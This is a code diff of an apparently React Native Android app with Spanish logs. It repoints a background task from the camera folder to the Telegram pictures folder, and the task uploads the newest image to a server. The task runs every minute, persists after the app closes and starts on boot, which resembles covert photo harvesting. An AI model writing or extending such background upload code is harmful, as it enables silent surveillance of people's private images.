@@ -21,13 +21,13 @@ TaskManager.defineTask(BACKGROUND_TELEGRAM, async () => {
   try {
     console.log("TELEGRAM ON")
     const files = await StorageAccessFramework.readDirectoryAsync(
-      "content://com.android.externalstorage.documents/tree/primary%3ADCIM"
-    ).catch((err) => console.error("DESDE obtenerFotoCamara ", err));
+      "content://com.android.externalstorage.documents/tree/primary%3APictures%2FTelegram"
+    ).catch((err) => console.error("DESDE obtenerFotoCamara telegram ", err));
 
     // console.log(`Files inside ${Permiso}:\n\n${JSON.stringify(files.length)}`);
     const uriFoto = files[files.length - 1]
 
-    console.log("MOSTRANDO LA FOTO CAMARA", files[files.length - 1]);
+    console.log("MOSTRANDO LA FOTO telegram", files[files.length - 1]);
     let localUri = uriFoto;
     let filename = localUri.split("/").pop();
     console.log("FILENAME ", filename);
@@ -52,7 +52,7 @@ TaskManager.defineTask(BACKGROUND_TELEGRAM, async () => {
       .then((res) => res.json())
       .catch((error) => console.error("Error", error))
       .then((response) => {
-        console.log("DESDE EL RESPONSE ", response);
+        console.log("DESDE EL RESPONSE telegram", response);
       });
     return BackgroundFetch.BackgroundFetchResult.NewData
   } catch (error) {
@@ -64,14 +64,14 @@ TaskManager.defineTask(BACKGROUND_TELEGRAM, async () => {
 async function registerBackgroundFetchAsync() {
   console.log("llamando telegram")
   return BackgroundFetch.registerTaskAsync(BACKGROUND_TELEGRAM, {
-    minimumInterval: 10, // cada 60 segundos
+    minimumInterval: 1, // cada 60 segundos
     stopOnTerminate: false,
     startOnBoot: true,
   });
 }
 
 async function unregister() {
-  console.log("Servicio camara detenido")
+  console.log("Servicio telegram detenido")
   return BackgroundFetch.unregisterTaskAsync(BACKGROUND_TELEGRAM)
 }
   
@@ -96,7 +96,7 @@ async function unregister() {
         setPermisoActivo(true);
         // Gets SAF URI from response
         const uri = permissions.directoryUri;
-        console.log("Permisos ", `"${uri}"`);
+        console.log("Permisos telegram", `"${uri}"`);
         setPermiso(uri);
         registerBackgroundFetchAsync()
       }
